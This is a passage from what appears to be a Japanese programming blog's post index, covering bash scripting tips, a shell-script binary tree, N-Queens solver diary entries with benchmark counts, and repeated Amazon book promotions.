#ルートノードから値を比較しながら下のノードに移動していく current=$root; parent=\u0026#34;\u0026#34;; while true;do parent=$current; #着目しているノードと目的の値を比較する。 #目的の値 \u0026lt; 着目しているノード」なら左の子が、次の着目ノードとなる。 if [ \u0026#34;$value\u0026#34; -lt $(${current}.getValue) ];then current=$(eval ${current}.getLeftChild); #存在すれば、次の着目ノードに移って繰り返し。 if [ -z \u0026#34;$current\u0026#34; ];then #次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の左(leftChild)位置にデータを挿入。 set_node_left $parent $id; return; fi #「着目しているノード ≤ 目的の値」なら右の子が、次の着目ノードとなる。 else current=$(eval ${current}.getRightChild); #存在すれば、次の着目ノードに移って繰り返し。 if [ -z \u0026#34;$current\u0026#34; ];then #次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の右(rightChild)位置にデータを挿入。 set_node_right $parent $id; return; fi fi done fi } 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-27T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-27-01-ani/path_hu71550af48fd719c5bc16d756459bb446_156863_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-09-27-01-ani/","title":"アルゴリズム日記 2022/09/27"},{"content":"ここではシェルスクリプトのBashについてのTIPSを紹介します。C言語やJavaといった高級言語にあってbashにはない部分について補完できる様々な手法をご紹介します。\nBashで普通に動くスクリプトを記述することはできるけど、C言語やJavaなどで記述したり構築したりするにはどうすればよいのか？ということについて、様々なアイディアも含めて、同等の表現方法がいくつかあるので、参考にしてください。\nシェルオプション setコマンドで便利にプログラミングする手法を紹介します。古来から伝わる便利な一行です。\n#! /usr/bin/bash set -ueo pipefail set -u : 未定義の変数を使用した箇所でスクリプトが正常終了します。変数名が異なる場合も実行できてしまうなどのありがちがバグを未然に防ぐことができます。\nset -e : スクリプトの実行中にエラーが発生した場合、エラーの箇所でスクリプトの処理が終了します。通常は、エラーが発生しても実行は中断されず、エラー箇所を特定するのはとても大変ですが、set -e オプションを付けておくとエラー箇所の特定が比較的カンタンになります。\nset -o pipefail : コマンド同士の連結にパイプ「｜」を使いますが、パイプ箇所でエラーが発生した場合に、パイプで連結したどのコマンドでエラーが発生したのかを特定することができます。\n上記３つのオプションを結合すると set -ueo pipefailをなります。通常、行頭のシェバン「#!/usr/bin/bash 」の下に一行空行を置き、その下に set -ueo pipefailを書くと良いです。\n変数の型を指定する シェルスクリプトでは変数の型を指定する必要はありませんが、指定しておくことで、間違った値を代入することがなくなり、しいてはバグが減ります。\n変数を数値として宣言する\niオプションを使用します。\ndeclare -i num=1+2 str=1+2 echo $num # =\u0026gt; 3 echo $str # =\u0026gt; 1+2 変数を配列として宣言する\naオプションを使用します。\ndeclare -a array=( Java Ruby Python ) echo ${array[0]} # =\u0026gt; Java echo ${#array[*]} #=\u0026gt; 3(配列の要素数) for e in ${array[*]} do echo $e # =\u0026gt; Java, Ruby, Pythonの順に出力 done for i in ${!array{*}} do echo ${array[i]} # =\u0026gt; Java, Ruby, Pythonの順位出力 done 変数を定数（読み取り専用）とし、初期化時に値を代入する\n-r オプションを使います。\n#!/usr/bin/bash set -ueo pipefail declare -r num=5; str=$((num+2)); echo $num # =\u0026gt; 5 echo $str # =\u0026gt; 7 ローカル変数を定義する シェルスクリプトはどこで宣言しようとすべてグローバル変数として扱われますが、localをつけることによって、明示的にもローカル変数を定義することができます。\nfunction fn() { # 問題のある例: local hoge=$(false) # $? で直前に実行したコマンドの終了ステータスを参照できる echo $? # =\u0026gt; エラーが握りつぶされ 0 が返る！ # 問題のない例: local hoge2 hoge2=$(false) echo $? # =\u0026gt; 正しく 1 が返る } インクリメント インクリメントなどは以下のように書くことができます。\n一般的な書き方\n#!/usr/bin/bash set -ueo pipefail value=0; value=`echo \u0026#34;$value+1\u0026#34; | bc`; echo \u0026#34;valueの値は \u0026#34; $value; スッキリとした書き方\n#!/usr/bin/bash set -uo pipefail # eをつけると動きません declare -i value=0; ((value++)); echo \u0026#34;valueの値は\u0026#34; $value; if C言語やJavaのような条件式で記述する メリットは以下のとおりです。\n・半角空白を配置する必要がない\n・一般的に短い行で記述できるようになる\n・条件式の変数に「$」を付ける必要がない\n・-gt は \u0026gt;、 -lt は \u0026lt;、-leは\u0026lt;=、で普通に記述できる\n一般的な記述\n#!/usr/bin/bash set -ueo pipefail x=4; if [ \u0026#34;$x\u0026#34; -gt 2 ] \u0026amp;\u0026amp; [ \u0026#34;$x\u0026#34; -le 5 ]; then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi 拡張した記述\n#!/usr/bin/bash set -ueo pipefail x=4; if ((x\u0026gt;2 \u0026amp;\u0026amp; x\u0026lt;=5)); then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi while C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail declare -i i=0; while((i++\u0026lt;10));do echo $i; done for C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++));do echo $i; done doやdoneを使わないもっとスッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++)){ echo $i; } grepで該当文字列があったら反応する # 一般的には以下のようにします。 if cat hoge.txt | grep \u0026#34;Apple\u0026#34; \u0026gt;/dev/null; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # --quiet は標準出力に何も書き出さないオプション if cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # 条件の反転は ! をつける if ! cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がない\u0026#34; fi 長い行の改行について 長い行の改行はバックスラッシュを末尾につける\naws --region ap-northeast-1 cloudformation deploy \\ --template-file ./packaged-template.yaml \\ --stack-name example-stack \\ --capabilities CAPABILITY_IAM \\ --parameter-overrides \\ Environment=development \\ EnableDebugLog=true 驚いたことに（僕も驚きました）パイプラインでの改行はエスケープがいらない！\ncat access.log | # IPアドレスのカラムを取得する awk \u0026#39;{print $5}\u0026#39; | # 100行目以降のみを集計対象とする tail +100 | # IPアドレスごとのアクセス数のランキングを集計する sort | uniq -c | sort -nr 関数パラメータは変数に格納する 関数に渡された値は $1,$2\u0026hellip;というふうにアクセスできます。\nとはいえ、関数の中で $1,$2を使うとなにがなんだかわかりにくくなります。\nですので、関数冒頭で変数に格納しましょう。\nもちろん忘れずに変数にはlocal 変数をつけましょう。\n変数の型がわかっているのであれば（わかっているでしょう）、declare -i などで明示的に変数の型を指定するのが望ましいのです。\nfunction do_something() { # まず最初に引数を意味のある命名の変数に取り出す local target_dir; local action target_dir=$1; action=$2; } スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ ヒント 色々と便利なbashですが、これからも便利な書き方があれば更新してきます。 マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 文字列からの配列の代入 一般的なwhile read 文。配列の内容を別の配列にコピーしています。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -i number=0; # 変数は数値型 declare -a my_array; # 変数は配列型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) echo ${my_array[@]}; 修正したスクリプト。while read がまるごと不要となっていますね。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); # コメントアウト # declare -i number=0; # 空白を区切り文字として配列に代入 declare -a my_array=(${month_array// / }); : \u0026#39; コメントアウト while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) \u0026#39; echo ${my_array[@]}; 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-26T14:19:38+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/","title":"【TIPS】ざっくりわかるシェルスクリプト"},{"content":"9月15日 グラフ理論を使ってエイトクイーンを解く方法があるらしい。\nNetworkXを使ってエイト・クイーンパズルを解く\nhttps://analytics-note.xyz/graph-theory/networkx-eight-queens-puzzle/\nまず、すべて効き筋同士をノードをつないぐ補グラフという仕組みを使うと、\n効き筋を通らない道筋を取得できfind_cliquesメソッドを使うと一発で解がわかるものみたい。\nまず、すべて効き筋同士をノードをつないだリストを作らないと行けないので行数が多くなるとメモリが足りなくなるので全てをエイトクイーンではできなさそう。\nでも、2行だけとか２列だけとかには使えそうなので調べてみると面白いかも。\npythonの初歩的なプログラムでちょっとつまったのでメモ\nanswers = [ clieque for clieque in nx.find_cliques(G_complement) if len(clieque) == bord_size ] こうかくとif 文の条件に合致したものだけリストに追加されるみたい。\nリスト内包表記というらしい。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-15T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-15-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-15-01-ani/","title":"NQueen日記 2022/09/15"},{"content":"9月9日 数が合わない点はsymmetryOps内での単純なコードの間違えだったため修正して数が合った。\nただ、速度が過去のロジックより２０％遅い。\nそこで、symmetryOpsを突破した数を調査してみた。\nKOHO2,KOHO4,KOHO8がそれぞれsymmetryOps を突破してCOUNT２,COUNT4,COUNT8の候補となったもの。\n数を出したところ、今のロジックは過去のロジックよりKOHO8の数が倍くらい多い。\n今のロジック ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00:STEP:6:KOHO2:1:KOHO4:0:KOHO8:0 5: 10 2 0.00:STEP:16:KOHO2:1:KOHO4:0:KOHO8:1 6: 4 1 0.00:STEP:55:KOHO2:1:KOHO4:1:KOHO8:3 7: 40 6 0.00:STEP:285:KOHO2:1:KOHO4:2:KOHO8:46 8: 92 12 0.00:STEP:1651:KOHO2:1:KOHO4:8:KOHO8:381 9: 352 46 0.00:STEP:7022:KOHO2:1:KOHO4:11:KOHO8:1889 10: 724 92 0.00:STEP:24935:KOHO2:5:KOHO4:38:KOHO8:6750 11: 2680 341 0.01:STEP:79391:KOHO2:5:KOHO4:47:KOHO8:22318 12: 14200 1788 0.03:STEP:237005:KOHO2:13:KOHO4:170:KOHO8:68576 13: 73712 9237 0.11:STEP:644806:KOHO2:13:KOHO4:191:KOHO8:198982 14: 365596 45771 0.51:STEP:1635763:KOHO2:25:KOHO4:574:KOHO8:539368 15: 2279184 285095 2.62:STEP:3843863:KOHO2:25:KOHO4:615:KOHO8:1373396 16: 14772512 1847425 15.11:STEP:8488361:KOHO2:41:KOHO4:1514:KOHO8:3265841 17: 95815104 11979381 1:38.70:STEP:17643021:KOHO2:41:KOHO4:1583:KOHO8:7307235 今までのロジック ６．nq27 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00:STEP:31:KOHO2:1:KOHO4:0:KOHO8:0 5: 10 2 0.00:STEP:153:KOHO2:1:KOHO4:0:KOHO8:2 6: 4 1 0.00:STEP:592:KOHO2:1:KOHO4:1:KOHO8:6 7: 40 6 0.00:STEP:2629:KOHO2:1:KOHO4:2:KOHO8:29 8: 92 12 0.00:STEP:12195:KOHO2:1:KOHO4:8:KOHO8:170 9: 352 46 0.00:STEP:52319:KOHO2:1:KOHO4:11:KOHO8:849 10: 724 92 0.00:STEP:199807:KOHO2:5:KOHO4:38:KOHO8:3696 11: 2680 341 0.01:STEP:675495:KOHO2:5:KOHO4:47:KOHO8:14614 12: 14200 1788 0.04:STEP:2010177:KOHO2:13:KOHO4:170:KOHO8:51301 13: 73712 9237 0.12:STEP:5362062:KOHO2:13:KOHO4:191:KOHO8:163839 14: 365596 45771 0.43:STEP:12987395:KOHO2:25:KOHO4:574:KOHO8:473312 15: 2279184 285095 1.93:STEP:29011301:KOHO2:25:KOHO4:615:KOHO8:1257054 16: 14772512 1847425 10.75:STEP:60470849:KOHO2:41:KOHO4:1514:KOHO8:3071660 17: 95815104 11979381 1:09.18:STEP:118819519:KOHO2:41:KOHO4:1583:KOHO8:6997422 調査したところ\nbacktrack1のところでsymmetryOpsをせずにKOHO8としてそのままnqueenに移行していたのが原因だった。\n上下左右2行２列全てにクイーン置けてないもの（例えば上下左は2行置けたが右は1行しか置けてないとか）を弾くようにしたらKOHO8の数も同じになった。\n上下左右2行２列にクイーンを置けないものは到達する可能性がないということが明らかになった。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 